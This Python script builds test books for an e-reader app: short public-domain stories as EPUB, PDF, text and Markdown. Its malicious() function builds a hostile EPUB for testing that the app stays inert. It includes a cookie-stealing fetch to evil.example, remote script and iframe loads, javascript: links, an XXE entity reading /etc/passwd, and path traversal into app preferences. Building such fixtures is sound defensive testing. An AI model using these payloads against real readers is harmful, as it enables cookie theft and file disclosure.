#!/usr/bin/env python3
"""Builds the test books in app/src/test/resources/books.

The stories are written for these tests and dedicated to the public domain (CC0), laid out the way
Project Gutenberg packages its books: one XHTML file per chapter, a cover, a table of contents.

  english-epub3.epub      EPUB 3, nav document, English
  swedish-epub2.epub      EPUB 2, NCX, Swedish (å ä ö), ISO-8859-1 chapter to test encodings
  images-notes.epub       EPUB 3 with an image, an SVG cover, footnotes and calibre series metadata
  malicious.epub          scripts, event handlers, remote resources, javascript: links, forms,
                          meta refresh, an XXE DOCTYPE and path traversal; must stay inert
  text.pdf                a PDF with a text layer, two columns on page 2
  scanned.pdf             a PDF that is only page images (no text)
  plain.txt / notes.md    plain text and Markdown

Run: python3 tools/make-test-books.py
"""
import io
import os
import zipfile

from PIL import Image, ImageDraw
from reportlab.lib.pagesizes import A5
from reportlab.pdfgen import canvas

OUT = os.path.join(os.path.dirname(__file__), '..', 'app', 'src', 'test', 'resources', 'books')
FIXED = (2026, 10, 17, 12, 0, 0)  # fixed timestamps keep the files byte-identical between runs

CONTAINER = '''<?xml version="1.0" encoding="UTF-8"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>'''

EN = [
    ('The Keeper', [
        'Edith Marlow came to Harwick on the last ferry of October, with one trunk and a letter from the Lighthouse Board.',
        'The harbour smelled of tar and rain. Captain Rowe met her on the quay and took the trunk without asking.',
        '“You will be the new keeper, then,” said Captain Rowe. “The last one lasted a winter.”',
        '“I mean to last longer than that,” said Edith.',
        'They walked the cliff path in silence. Below them the sea worked at the rocks the way a dog works at a bone.',
        'The lighthouse stood at the end of the headland, white and narrow, its lamp dark in the afternoon light.',
        'Inside, the logbook lay open on the table. The last entry was dated in March and ended in the middle of a word.',
        'Edith read it twice, closed the book, and climbed the hundred and twelve steps to the lamp room.',
        'The lamp room was cold and smelled of paraffin. The great lens sat in its brass cage like a sleeping animal.',
        'She wound the clockwork that turned the lens, trimmed the wicks, and polished the glass until her arms ached.',
        'From the gallery she could see the whole of Harwick: the harbour, the chapel, the row of white cottages along the quay.',
        'Beyond the harbour the sea darkened toward the Shoals, where the water broke white over rocks she could not see.',
        'At dusk she lit the lamp. The beam swept out across the water, and somewhere below a dog began to bark.',
        'Captain Rowe had left a loaf and a jug of milk on the kitchen table. She ate standing up, watching the light turn.',
        'That night she slept in her clothes on the narrow bed below the lamp room, and woke every two hours to wind the clockwork.',
        'In the morning the logbook was still open at the unfinished entry, as if the old keeper had only stepped out.',
    ]),
    ('The Logbook', [
        'For a week Edith kept the lamp, wound the clockwork, and wrote the weather in the logbook every four hours.',
        'On the eighth day Martha Rowe, the captain’s sister, came up the path with bread and a basket of eggs.',
        '“People in Harwick talk,” said Martha. “They say the old keeper saw lights out past the Shoals.”',
        'Edith showed her the unfinished entry. Martha read it and went pale. “He wrote that the night he left.”',
        'That evening Edith searched the lamp room and found a second logbook behind a loose board, wrapped in oilcloth.',
        'The second logbook was full of numbers: times, bearings, and the same three letters repeated, S. H. L.',
        'She sat up late with the lamp turning above her, matching the bearings to the chart of the Shoals.',
        'Every bearing pointed to the same place, a rock the chart called the Grey Widow.',
        'She went down to the harbour the next morning and found Captain Rowe mending nets outside his cottage.',
        '“Who was the old keeper?” Edith asked. “Nobody has told me his name.”',
        '“Samuel Hale,” said Captain Rowe, without looking up. “He kept the light for nine years before he went.”',
        'S. H. L., Edith thought. Samuel Hale, Lighthouse. He had been signing his own name in the margins.',
        '“Where did he go?” she asked. The captain put down his needle and looked out toward the Shoals for a long time.',
        '“Nobody knows,” he said at last. “His boat was found on the beach in April. He was not in it.”',
    ]),
    ('The Grey Widow', [
        'Captain Rowe refused at first. Nobody took a boat to the Grey Widow in November, he said, not for any money.',
        'Edith did not offer money. She showed him the second logbook, and after a long time he nodded.',
        'They left at first light. The sea was flat and the colour of pewter, and the Grey Widow rose out of it like a fist.',
        'On the rock they found a tin box chained to an iron ring, and inside it a bundle of letters addressed to Martha Rowe.',
        '“He was not mad,” said Captain Rowe quietly. “He was writing to her.”',
        'The letters told the rest: the old keeper had signalled to a ship each night, a ship that was never coming.',
        'On the way back the weather turned. Rain came in sideways and the boat shipped water over the bow.',
        'Edith bailed while the captain steered by the light she had left burning, and they came into Harwick after dark.',
        'Martha Rowe was waiting on the quay with a lantern, her shawl wet through, as if she had been there for hours.',
        'Captain Rowe gave her the tin box without a word. She held it against her chest and did not open it.',
        'In the warm kitchen of the captain’s cottage they sat with tea while the storm shook the windows.',
        '“Samuel asked me to marry him,” Martha said quietly. “I told him to ask me again when he had left the light.”',
        '“He never left it,” said Edith. “Not really. He wrote to you every night from the lamp room.”',
    ]),
    ('The Light', [
        'Martha read the letters at the kitchen table while the rain went on outside.',
        'When she had finished she folded them, tied them with string, and put them in her apron pocket.',
        '“I will answer them,” said Martha. “Even if it is too late, I will answer them.”',
        'Edith went back to the lighthouse and wrote the whole story in the logbook, in the plain hand the Board required.',
        'Then she finished the old keeper’s last entry, the word he had left half written, and signed her name below it.',
        'Winter came. The lamp turned every night, and from the harbour the people of Harwick could see it plainly.',
        'Edith stayed that winter and the next, and in time nobody in Harwick remembered that the keepers used to leave.',
    ]),
]

SV = [
    ('Ön', [
        'Sommaren då Anna Berg fyllde tolv år flyttade familjen ut till Gråskär, en ö längst ut i skärgården.',
        'Pappa Erik skulle sköta fyren, och mamma Karin skulle måla. Det var åtminstone vad de sade.',
        '– Här finns ingenting att göra, sade Anna när hon klev i land.',
        '– Här finns allting att göra, svarade farbror Olof och räckte henne en fiskespö.',
        'Ön var liten och kal. Mitt på den låg ett rött hus med vita knutar, och längst ut på udden stod fyren.',
        'På kvällen satt Anna på trappan och såg hur ljuset från fyren svepte över vattnet, varv efter varv.',
    ]),
    ('Fyren', [
        'Varje morgon gick Anna och Olof längs stranden och letade efter saker som havet hade fört med sig.',
        'De hittade flaskor, rep, en trasig åra och en gång en låda med främmande bokstäver på locket.',
        '– Den kommer från ett skepp, sade Olof. – Kanske från Ryssland, kanske från Finland.',
        'I lådan låg ett brev som ingen av dem kunde läsa. Anna lade det i sin dagbok och tänkte på det hela dagen.',
        'På natten drömde hon om skeppet, om männen ombord och om den som hade skrivit brevet.',
        'När hösten kom lärde hon sig sköta fyren själv, och pappa Erik lät henne skriva i loggboken.',
    ]),
    ('Brevet', [
        'Den sista veckan kom en båt från fastlandet med post, mjöl och en lärare som hette Greta Lind.',
        'Greta kunde läsa brevet. Det var skrivet på finska, av en sjöman till hans dotter.',
        '– Han skriver att han tänker på henne varje gång han ser en fyr, sade Greta.',
        'Anna satt tyst länge. Sedan bad hon Greta hjälpa henne att skriva ett svar, fast ingen visste vart det skulle skickas.',
        'De lade svaret i en flaska och kastade den från udden när solen gick ned bakom Gråskär.',
    ]),
]


def write_zip(path, files):
    """files: list of (name, bytes, stored?) — mimetype first and stored, as the spec requires."""
    with zipfile.ZipFile(path, 'w') as z:
        for name, data, stored in files:
            info = zipfile.ZipInfo(name, FIXED)
            info.compress_type = zipfile.ZIP_STORED if stored else zipfile.ZIP_DEFLATED
            z.writestr(info, data)


def xhtml(title, body, lang='en', head_extra=''):
    return ('<?xml version="1.0" encoding="utf-8"?>\n<!DOCTYPE html>\n'
            '<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" lang="%s" xml:lang="%s">\n'
            '<head><title>%s</title><link rel="stylesheet" type="text/css" href="style.css"/>%s</head>\n<body>\n%s\n</body>\n</html>\n'
            % (lang, lang, title, head_extra, body))


def chapter_body(n, title, paras):
    return '<section epub:type="chapter" id="ch%d">\n<h2>%s</h2>\n%s\n</section>' % (
        n, title, '\n'.join('<p>%s</p>' % p for p in paras))


STYLE = 'body { font-family: serif; } h2 { text-align: center; margin: 2em 0 1em; } p { text-indent: 1.2em; margin: 0; } .note { font-size: 0.85em; }'


def cover_png(title, colour):
    im = Image.new('RGB', (600, 900), colour)
    d = ImageDraw.Draw(im)
    d.rectangle([40, 40, 560, 860], outline=(255, 255, 255), width=6)
    d.text((80, 420), title, fill=(255, 255, 255))
    b = io.BytesIO()
    im.save(b, 'PNG', optimize=True)
    return b.getvalue()


def english():
    man, spine, nav = [], [], []
    files = [('mimetype', 'application/epub+zip', True), ('META-INF/container.xml', CONTAINER, False),
             ('OEBPS/style.css', STYLE, False), ('OEBPS/images/cover.png', cover_png('The Keeper of Harwick Light', (40, 60, 90)), False)]
    files.append(('OEBPS/cover.xhtml', xhtml('Cover', '<div style="text-align:center"><img src="images/cover.png" alt="Cover"/></div>'), False))
    for i, (t, ps) in enumerate(EN, 1):
        name = 'chapter%02d.xhtml' % i
        files.append(('OEBPS/' + name, xhtml(t, chapter_body(i, 'Chapter %d. %s' % (i, t), ps)), False))
        man.append('<item id="c%d" href="%s" media-type="application/xhtml+xml"/>' % (i, name))
        spine.append('<itemref idref="c%d"/>' % i)
        nav.append('<li><a href="%s#ch%d">Chapter %d. %s</a></li>' % (name, i, i, t))
    navdoc = xhtml('Contents', '<nav epub:type="toc" id="toc"><h1>Contents</h1><ol>\n%s\n</ol></nav>\n'
                   '<nav epub:type="landmarks" hidden=""><ol><li><a epub:type="cover" href="cover.xhtml">Cover</a></li></ol></nav>' % '\n'.join(nav))
    files.append(('OEBPS/nav.xhtml', navdoc, False))
    opf = '''<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id" xml:lang="en">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="id">urn:uuid:5b3f0c1e-margin-test-en</dc:identifier>
    <dc:title>The Keeper of Harwick Light</dc:title>
    <dc:creator>Ada Testwright</dc:creator>
    <dc:language>en</dc:language>
    <dc:publisher>Margin Test Press</dc:publisher>
    <dc:description>&lt;p&gt;A lighthouse keeper finds the &lt;b&gt;old logbook&lt;/b&gt;.&lt;/p&gt;</dc:description>
    <meta property="dcterms:modified">2026-10-17T12:00:00Z</meta>
  </metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="cover-image" href="images/cover.png" media-type="image/png" properties="cover-image"/>
    <item id="cover" href="cover.xhtml" media-type="application/xhtml+xml"/>
    <item id="css" href="style.css" media-type="text/css"/>
    %s
  </manifest>
  <spine>
    <itemref idref="cover" linear="no"/>
    %s
  </spine>
</package>''' % ('\n    '.join(man), '\n    '.join(spine))
    files.append(('OEBPS/content.opf', opf, False))
    write_zip(os.path.join(OUT, 'english-epub3.epub'), files)


def swedish():
    man, spine, points = [], [], []
    files = [('mimetype', 'application/epub+zip', True), ('META-INF/container.xml', CONTAINER, False), ('OEBPS/style.css', STYLE, False)]
    for i, (t, ps) in enumerate(SV, 1):
        name = 'kapitel%d.html' % i
        doc = xhtml(t, chapter_body(i, 'Kapitel %d. %s' % (i, t), ps), lang='sv')
        if i == 2:
            # One chapter in ISO-8859-1, declared in the XML header, as some older books are.
            doc = doc.replace('encoding="utf-8"', 'encoding="ISO-8859-1"').replace('–', '-').encode('iso-8859-1')
        files.append(('OEBPS/' + name, doc, False))
        man.append('<item id="k%d" href="%s" media-type="application/xhtml+xml"/>' % (i, name))
        spine.append('<itemref idref="k%d"/>' % i)
        points.append('<navPoint id="np%d" playOrder="%d"><navLabel><text>Kapitel %d. %s</text></navLabel><content src="%s"/></navPoint>' % (i, i, i, t, name))
    ncx = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ncx PUBLIC "-//NISO//DTD ncx 2005-1//EN" "http://www.daisy.org/z3986/2005/ncx-2005-1.dtd">
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/" version="2005-1">
  <head><meta name="dtb:uid" content="margin-test-sv"/></head>
  <docTitle><text>Sommaren på Gråskär</text></docTitle>
  <navMap>
    %s
  </navMap>
</ncx>''' % '\n    '.join(points)
    files.append(('OEBPS/toc.ncx', ncx, False))
    opf = '''<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="2.0" unique-identifier="id">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:opf="http://www.idpf.org/2007/opf">
    <dc:identifier id="id">margin-test-sv</dc:identifier>
    <dc:title>Sommaren på Gråskär</dc:title>
    <dc:creator opf:role="aut">Åsa Provskrivare</dc:creator>
    <dc:language>sv</dc:language>
    <meta name="calibre:series" content="Skärgårdsböckerna"/>
    <meta name="calibre:series_index" content="2"/>
  </metadata>
  <manifest>
    <item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>
    <item id="css" href="style.css" media-type="text/css"/>
    %s
  </manifest>
  <spine toc="ncx">
    %s
  </spine>
</package>''' % ('\n    '.join(man), '\n    '.join(spine))
    files.append(('OEBPS/content.opf', opf, False))
    write_zip(os.path.join(OUT, 'swedish-epub2.epub'), files)


def images_notes():
    im = Image.new('RGB', (480, 300), (225, 210, 180))
    d = ImageDraw.Draw(im)
    d.polygon([(240, 30), (270, 270), (210, 270)], fill=(250, 250, 245), outline=(60, 60, 60))
    d.ellipse([225, 40, 255, 70], fill=(250, 200, 60))
    b = io.BytesIO()
    im.save(b, 'PNG', optimize=True)
    svg_cover = ('<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 900" width="600" height="900">'
                 '<rect width="600" height="900" fill="#3a5a40"/><text x="300" y="450" font-size="40" text-anchor="middle" fill="#fff">Notes from the Coast</text></svg>')
    ch1 = ('<section epub:type="chapter" id="c1"><h2>I. The Chart</h2>'
           '<p>The chart of the Shoals was drawn in 1851 by a surveyor who never set foot on the rocks.<a epub:type="noteref" href="notes.xhtml#n1" id="r1">1</a></p>'
           '<figure><img src="images/light.png" alt="A lighthouse"/><figcaption>The light at Harwick, from the surveyor’s sketch.</figcaption></figure>'
           '<p>Fishermen corrected it in pencil for fifty years.<a epub:type="noteref" href="#n2" id="r2">2</a> Their corrections are still the best guide.</p>'
           '<aside epub:type="footnote" id="n2"><p>The pencil copy is kept in the harbour office.</p></aside>'
           '<blockquote><p>“Trust the pencil, not the ink,” the harbour master used to say.</p></blockquote>'
           '<ul><li>Grey Widow — a rock</li><li>Long Shoal — a reef</li></ul>'
           '<p>See also <a href="https://example.org/charts">the online archive</a>.</p></section>')
    notes = ('<section epub:type="endnotes"><h2>Notes</h2><ol>'
             '<li><aside epub:type="endnote" id="n1"><p>His name was Thomas Ellery. <a href="chapter1.xhtml#r1">↩</a></p></aside></li></ol></section>')
    files = [('mimetype', 'application/epub+zip', True), ('META-INF/container.xml', CONTAINER, False), ('OEBPS/style.css', STYLE, False),
             ('OEBPS/images/light.png', b.getvalue(), False), ('OEBPS/images/cover.svg', svg_cover, False),
             ('OEBPS/chapter1.xhtml', xhtml('The Chart', ch1), False), ('OEBPS/notes.xhtml', xhtml('Notes', notes), False),
             ('OEBPS/nav.xhtml', xhtml('Contents', '<nav epub:type="toc"><ol><li><a href="chapter1.xhtml">I. The Chart</a>'
                                                   '<ol><li><a href="chapter1.xhtml#n2">A footnote</a></li></ol></li><li><a href="notes.xhtml">Notes</a></li></ol></nav>'), False)]
    opf = '''<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="id">margin-test-notes</dc:identifier>
    <dc:title>Notes from the Coast</dc:title>
    <dc:creator>Ada Testwright</dc:creator>
    <dc:creator>B. Example</dc:creator>
    <dc:language>en-GB</dc:language>
    <meta property="belongs-to-collection" id="col">Harwick Papers</meta>
    <meta refines="#col" property="collection-type">series</meta>
    <meta refines="#col" property="group-position">1.5</meta>
  </metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="cover" href="images/cover.svg" media-type="image/svg+xml" properties="cover-image"/>
    <item id="img" href="images/light.png" media-type="image/png"/>
    <item id="css" href="style.css" media-type="text/css"/>
    <item id="c1" href="chapter1.xhtml" media-type="application/xhtml+xml"/>
    <item id="notes" href="notes.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine>
    <itemref idref="c1"/>
    <itemref idref="notes"/>
  </spine>
</package>'''
    files.append(('OEBPS/content.opf', opf, False))
    write_zip(os.path.join(OUT, 'images-notes.epub'), files)


def malicious():
    evil = ('<section><h2 onclick="alert(1)">Chapter</h2>'
            '<script>window.parent.postMessage("pwned","*");document.title="pwned";fetch("https://evil.example/steal?c="+document.cookie)</script>'
            '<p onmouseover="alert(2)">Hover text with an <img src="https://evil.example/pixel.gif" alt="remote pixel"/> image.</p>'
            '<p><a href="javascript:alert(3)">javascript link</a> · <a href="https://evil.example/">remote link</a> · <a href="data:text/html,&lt;script&gt;alert(4)&lt;/script&gt;">data link</a></p>'
            '<iframe src="https://evil.example/frame"></iframe><object data="https://evil.example/flash.swf"></object>'
            '<form action="https://evil.example/post" method="post"><input name="q" value="x"/><button>Send</button></form>'
            '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><script>alert(5)</script><image href="https://evil.example/svg.png" width="10" height="10"/></svg>'
            '<p style="background:url(https://evil.example/bg.png)">Styled paragraph.</p>'
            '<p><a href="../../../../data/data/io.github.rushivangala.margin/shared_prefs/kit.xml">traversal</a></p>'
            '<p>Plain text that must still be readable.</p></section>')
    head = ('<meta http-equiv="refresh" content="0;url=https://evil.example/"/>'
            '<link rel="stylesheet" href="https://evil.example/remote.css"/><base href="https://evil.example/"/>'
            '<script src="https://evil.example/remote.js"></script>')
    doc = xhtml('Evil', evil, head_extra=head)
    css = '@import url("https://evil.example/import.css"); body { background: url("https://evil.example/body.png"); } @font-face { font-family: X; src: url("https://evil.example/x.woff2"); }'
    opf = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE package [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> <!ENTITY big "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"> ]>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="id">margin-test-evil</dc:identifier>
    <dc:title>Evil &xxe; Book</dc:title>
    <dc:creator>&big;</dc:creator>
    <dc:language>en</dc:language>
  </metadata>
  <manifest>
    <item id="c1" href="evil.xhtml" media-type="application/xhtml+xml"/>
    <item id="css" href="style.css" media-type="text/css"/>
    <item id="trav" href="../../../etc/passwd" media-type="application/xhtml+xml"/>
    <item id="ext" href="https://evil.example/chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine>
    <itemref idref="trav"/>
    <itemref idref="ext"/>
    <itemref idref="c1"/>
  </spine>
</package>'''
    files = [('mimetype', 'application/epub+zip', True), ('META-INF/container.xml', CONTAINER, False),
             ('OEBPS/content.opf', opf, False), ('OEBPS/evil.xhtml', doc, False), ('OEBPS/style.css', css, False)]
    write_zip(os.path.join(OUT, 'malicious.epub'), files)


LOREM = ('The surveyor came ashore at Harwick in the spring of 1851 and spent the summer measuring the bay from a rowing boat. '
         'He worked from first light until the tide turned, writing bearings in a small book that he kept in his coat. '
         'In the evenings he drew the chart by lamplight in the room above the harbour office, and the fishermen came to watch.')


def pdfs():
    c = canvas.Canvas(os.path.join(OUT, 'text.pdf'), pagesize=A5, invariant=1)
    c.setTitle('Notes on the Harwick Chart')
    c.setAuthor('Ada Testwright')
    w, h = A5
    c.setFont('Helvetica-Bold', 16)
    c.drawString(40, h - 60, 'Notes on the Harwick Chart')
    c.setFont('Helvetica', 10)
    y = h - 90
    for line in wrap(LOREM * 2, 70):
        c.drawString(40, y, line)
        y -= 14
    c.showPage()
    c.setFont('Helvetica', 9)
    col = (w - 100) / 2
    for i, x in enumerate((40, 60 + col)):
        y = h - 50
        for line in wrap(('Column %s. ' % ('one' if i == 0 else 'two')) + LOREM, 34):
            c.drawString(x, y, line)
            y -= 12
    c.showPage()
    c.save()

    # scanned.pdf: two pages that are pictures of text, with no text layer at all
    c = canvas.Canvas(os.path.join(OUT, 'scanned.pdf'), pagesize=A5, invariant=1)
    for p in range(2):
        im = Image.new('L', (840, 1190), 238)
        d = ImageDraw.Draw(im)
        y = 80
        for line in wrap(LOREM, 60):
            d.text((60, y), line, fill=30)
            y += 26
        b = io.BytesIO()
        im.save(b, 'JPEG', quality=70)
        b.seek(0)
        from reportlab.lib.utils import ImageReader
        c.drawImage(ImageReader(b), 0, 0, w, h)
        c.showPage()
    c.save()


def wrap(text, width):
    out, line = [], ''
    for word in text.split():
        if len(line) + len(word) + 1 > width:
            out.append(line)
            line = word
        else:
            line = (line + ' ' + word).strip()
    if line:
        out.append(line)
    return out


def plain():
    with open(os.path.join(OUT, 'plain.txt'), 'w', encoding='utf-8') as f:
        f.write('THE HARBOUR\n\n\n')
        for t, ps in EN[:2]:
            f.write(t.upper() + '\n\n')
            for p in ps:
                # Gutenberg-style hard wrapping at about 70 characters
                f.write('\n'.join(wrap(p, 70)) + '\n\n')
            f.write('\n')
    with open(os.path.join(OUT, 'notes.md'), 'w', encoding='utf-8') as f:
        f.write('# Keeper’s notes\n\nSome **bold** words, some *italic* ones and `code`.\n\n## Lamps\n\n- Wind the clockwork\n- Trim the wick\n\n> The light must never go out.\n\n'
                '1. First\n2. Second\n\n[A link](https://example.org) and <script>alert(1)</script> raw HTML that must be shown as text.\n')


if __name__ == '__main__':
    os.makedirs(OUT, exist_ok=True)
    english()
    swedish()
    images_notes()
    malicious()
    pdfs()
    plain()
    print('Wrote', ', '.join(sorted(os.listdir(OUT))))
